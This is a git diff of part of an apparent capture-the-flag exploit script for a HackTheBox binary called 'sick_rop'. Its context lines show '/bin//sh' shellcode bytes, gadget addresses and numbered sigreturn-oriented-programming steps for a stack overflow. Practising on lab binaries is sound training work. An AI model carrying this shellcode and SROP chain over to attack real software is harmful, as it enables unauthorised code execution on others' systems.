@@ -22,7 +22,7 @@ shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\
 # [+] In '/home/fresh/CTF/htb/sick_ROP/sick_rop'(0x401000-0x402000), permission=r-x
 #   0x4010d8 - 0x4010e4  →   "\x2e\x10\x40[...]" 
 vuln_pointer = 0x4010d8
-syscall = 0x401014
+syscall = p64(0x401014)
 vuln  = p64(0x40102e)
 rwx = 0x400000
 
@@ -37,9 +37,9 @@ frame.rsp = vuln_pointer  # Notes below for vuln_pointer instead of vuln() addre
 frame.rip = syscall
 
 # Why not vuln function but a pointer to vuln?
-# Stack frames changed. Calling the vuln function directly will not get us to that function
+# Stack frames changed. Calling the vuln function directly will not get us to that function.
 
-# 1. Padding
+# 1. Padding to Overflow
 # 2. ret2vuln() to adjust RAX to 0xf with 2nd payload
 # 3. 'syscall; ret' gadget to use sigreturn()
 # 4. bytes(frame) sets up the stack after sigreturn() is called and 
